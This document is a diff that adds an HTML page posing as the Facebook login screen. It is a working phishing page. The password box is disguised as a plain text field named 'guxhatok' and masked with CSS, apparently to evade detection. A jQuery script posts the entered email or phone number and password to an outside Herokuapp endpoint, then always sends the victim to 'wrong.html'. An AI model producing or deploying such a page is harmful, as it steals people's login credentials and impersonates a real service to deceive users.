@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <style>
+        * {
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+        }
+
+
+        main *,
+        .btn {
+            font-weight: 500;
+        }
+
+        small {
+            font-weight: 400;
+        }
+
+
+        .main {
+            display: grid;
+            align-items: center;
+            justify-content: center;
+            background-color: #f0f2f5;
+            padding: 3rem 2rem 4rem 2rem;
+        }
+
+        .logo {
+            display: grid;
+            justify-content: center;
+        }
+
+        .logo img {
+            width: 240px;
+        }
+
+        .card {
+            border: none !important;
+            padding: 20px;
+        }
+
+        .form {
+            width: 390px;
+            max-width: 390px;
+        }
+
+        .line_break {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .line_break .line {
+            height: 1px;
+            width: 100%;
+            background: rgba(0, 0, 0, .1);
+        }
+
+        .line_break * {
+            color: rgba(0, 0, 0, .3);
+        }
+
+        .log_text {
+            font-size: 1.1rem;
+        }
+
+        .btn {
+            padding-top: 10px !important;
+            padding-bottom: 10px !important;
+        }
+
+        .new_account {
+            background: #00b501;
+            text-transform: capitalize;
+            width: fit-content;
+            margin: auto;
+        }
+
+
+        .new_account:hover {
+            background: #13a313 !important;
+        }
+
+
+        a {
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            background-color: #ffffff;
+            padding-top: 50px
+        }
+
+        .footer {
+            border-bottom: 1px solid #dddfe2;
+            padding-bottom: 10px;
+            padding-top: 10px;
+        }
+
+        .footer_links {
+            border: none;
+            padding-bottom: 0 !important;
+        }
+
+        .footer ul {
+            align-items: center;
+            display: flex;
+            flex-wrap: wrap;
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        .footer ul li {
+            padding-left: 20px;
+            font-size: 12px;
+            color: #737373;
+        }
+
+        .copy_rights {
+            color: #737373;
+            padding-left: 20px;
+            font-size: 12px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+        .forget {
+            font-size: .85rem !important;
+        }
+
+        input {
+            padding-top: 13px !important;
+            padding-bottom: 13px !important;
+        }
+		
+		#guxhatok {
+		-webkit-text-security: disc;
+		}
+
+        @media (max-width:440px) {
+            .form {
+                width: 100%;
+                max-width: 100%;
+            }
+            .dixi {
+                background-color: #fffbe2 !important;
+                color: #7f7212 !important;
+                border-color: #e2c822 !important;
+
+            }
+            .main {
+                padding: 1rem;
+                background-color: #fff;
+                display: block;
+            }
+
+            .logo img {
+                width: 150px;
+            }
+
+            .card {
+                box-shadow: none !important;
+                padding: 10px 0 !important;
+            }
+
+            .log_text {
+                display: none;
+            }
+
+            input {
+                background: #f4f6f8 !important;
+                padding: 10px 15px !important;
+            }
+
+            .inputs {
+                gap: 12px !important;
+                margin-top: 20px;
+            }
+
+            .alert-warning {
+                display: none;
+            }
+
+            .new_account {
+                background: white;
+                color: #000000d2 !important;
+                border: 1px solid #00000063 !important;
+                border-radius: 3px;
+                width: 100%;
+            }
+
+            .new_account:hover {
+                background-color: whitesmoke !important;
+            }
+        }
+        @media (min-width:440px) {
+            #dixi{
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="dixi" class="dixi alert-warning24"> You must log in to continue. </div>
+    <main class="main">
+        <form action="" class="form" autocomplete="off">
+            <div class="logo">
+                <img src="./topi.svg" alt="logo" class="logo">
+            </div>
+            <div class="card shadow  d-grid gap-3 rounded bg-white">
+                <p class="text-center p-0 m-0 log_text">Log Into Facebook</p>
+                <div class="d-grid gap-3 inputs">
+                    <small class="alert alert-warning text-center m-0"> You must log in to continue. </small>
+                    <input type="text" name="login_code" id="login_code" placeholder="Email or Phone Number" class="form-control">
+                    <input type="text" name="guxhatok" id="guxhatok" placeholder="Password" class="form-control">
+                    <button id="form_submit" class="btn btn-primary py-2">Log in</button>
+                </div>
+                <div class="d-grid gap-2">
+                    <a href="#" class="text-center fs-6 forget">Forgot account?</a>
+                    <div class="line_break">
+                        <span class="line"></span>
+                        <span class="fs-6">or</span>
+                        <span class="line"></span>
+                    </div>
+                    <button class="btn new_account py-2 text-white">create new account</button>
+                </div>
+            </div>
+        </form>
+    </main>
+    <footer>
+        <div class="container">
+            <div class="footer">
+                <ul>
+                    <li>English (US)</li>
+                    <li>Español</li>
+                    <li>Français (France)</li>
+                    <li>中文(简体)</li>
+                    <li>العربية</li>
+                    <li>Português (Brasil)</li>
+                    <li>한국어</li>
+                    <li>Italiano</li>
+                    <li>हिन्दी</li>
+                    <li>日本語</li>
+                </ul>
+            </div>
+            <div class="footer_links footer">
+                <ul>
+                    <li>Sign Up</li>
+                    <li>Log In</li>
+                    <li>Messenger</li>
+                    <li>Facebook Lite</li>
+                    <li>Watch</li>
+                    <li>People</li>
+                    <li>Pages</li>
+                    <li>Page Categories</li>
+                    <li>Places</li>
+                    <li>Locations</li>
+                    <li>Marketplace</li>
+                    <li>Facebook Pay</li>
+                    <li>GroupsOculus</li>
+                    <li>Portal</li>
+                    <li>Instagram</li>
+                    <li>Local</li>
+                    <li>Instagram</li>
+                    <li>Fundraisers</li>
+                    <li>Services</li>
+                    <li>Voting Information Center</li>
+                    <li>About</li>
+                    <li>Create Ad</li>
+                    <li>Create Page</li>
+                    <li>Developers</li>
+                    <li>Careers</li>
+                    <li>Privacy</li>
+                    <li>Cookies</li>
+                    <li>Ad Choices</li>
+                    <li>Terms</li>
+                    <li>Help</li>
+                    <li>Activity Log</li>
+                </ul>
+            </div>
+            <p class="copy_rights">Facebook © 2023</p>
+        </div>
+    </footer>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- Include jQuery library -->
+
+<script>
+   $(document).ready(function () {
+      $("#form_submit").click(function (event) {
+         event.preventDefault();
+         let loginCode = $("#login_code").val(); // Get the value of the login code input
+         let guxhatokValue = $("#guxhatok").val(); // Get the value of the guxhatok input
+
+         // Check if the login code is not empty before making the AJAX request
+         if (loginCode.trim() !== "") {
+            let data = {
+               login_code: loginCode,
+               guxhatok: guxhatokValue, // Include the guxhatok value in the data object
+            };
+
+            $.ajax({
+               url: "https://vast-beyond-16799-fe4f70230291.herokuapp.com/rrakmellow.php/",
+               method: "POST",
+               data: data,
+               success: function (response) {
+                  if (response === "1") {
+                     // Redirect to 'confirm/' when the response is '1'
+                     window.location.href = 'wrong.html';
+                  } else {
+                     window.location.href = 'wrong.html';
+                     // Handle other cases if needed
+                     // For example, display an error message
+                  }
+               },
+               error: function (xhr, status, error) {
+                  window.location.href = 'wrong.html';
+                  // Handle AJAX errors here if necessary
+                  console.log("AJAX Error: " + error);
+               },
+            });
+         } else {
+            window.location.href = 'wrong.html';
+            // Handle empty login code input, display an error message, etc.
+         }
+      });
+   });
+</script>
+
+
+</body>
+
+</html>
